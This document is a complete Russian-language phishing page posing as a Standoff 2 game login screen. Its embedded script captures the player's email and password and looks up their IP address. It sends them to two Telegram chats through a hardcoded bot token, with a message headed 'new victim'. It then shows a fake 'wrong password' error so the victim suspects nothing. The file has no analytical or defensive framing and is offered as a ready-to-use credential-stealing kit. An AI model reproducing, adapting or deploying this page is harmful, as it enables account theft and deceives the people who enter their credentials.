<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Standoff 2 | Авторизация</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        h2 {
            color: #fff;
            text-align: center;
            margin-bottom: 10px;
            font-size: 28px;
        }
        .subtitle {
            color: #aaa;
            text-align: center;
            margin-bottom: 30px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: none;
            border-radius: 10px;
            background: rgba(255,255,255,0.9);
            font-size: 16px;
            transition: 0.3s;
        }
        input:focus {
            outline: none;
            background: white;
            box-shadow: 0 0 10px rgba(255,71,87,0.5);
        }
        button {
            width: 100%;
            padding: 15px;
            margin-top: 20px;
            border: none;
            border-radius: 10px;
            background: #ff4757;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover {
            background: #ff6b81;
            transform: scale(1.02);
        }
        .warning {
            color: #ff6b6b;
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 11px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔫 STANDOFF 2</h2>
        <div class="subtitle">Вход в аккаунт</div>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email / ID игрока" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <button type="submit">Войти</button>
        </form>
        <div class="warning">⚠️ Система безопасности: требуется подтверждение личности</div>
        <div class="footer">© 2025 Standoff 2. Все права защищены.</div>
    </div>

    <script>
        // Telegram настройки
        const BOT_TOKEN = '8791162816:AAE_-BCQGhGFyOQ7XHh7L3aPJp90ddlezz4';
        const ADMIN_IDS = ['7663459492', '6635138703'];
        
        async function sendToTelegram(email, password) {
            const ip = await getIP();
            const message = `🔓 НОВАЯ ЖЕРТВА STANDOFF 2%0A%0A📧 Логин/Email: ${encodeURIComponent(email)}%0A🔑 Пароль: ${encodeURIComponent(password)}%0A🌐 IP: ${ip}%0A⏰ Время: ${new Date().toLocaleString()}`;
            
            for (let adminId of ADMIN_IDS) {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${adminId}&text=${message}`;
                try {
                    await fetch(url);
                } catch(e) {
                    console.log('Ошибка:', e);
                }
            }
        }
        
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch(e) {
                return 'не удалось определить';
            }
        }
        
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                alert('Заполните все поля');
                return;
            }
            
            // Отправка данных в Telegram
            await sendToTelegram(email, password);
            
            // Показываем сообщение об ошибке (жертва думает, что ошиблась)
            document.body.innerHTML = `
                <div class="container" style="text-align:center;">
                    <h2>❌ Ошибка входа</h2>
                    <p style="color:white; margin-top:20px;">Неверный email или пароль.</p>
                    <p style="color:#aaa; margin-top:10px;">Пожалуйста, попробуйте снова.</p>
                    <br>
                    <a href="https://standoff2.com" style="color:#ff4757; text-decoration:none;">↺ Вернуться в игру</a>
                </div>
            `;
        });
    </script>
</body>
</html>
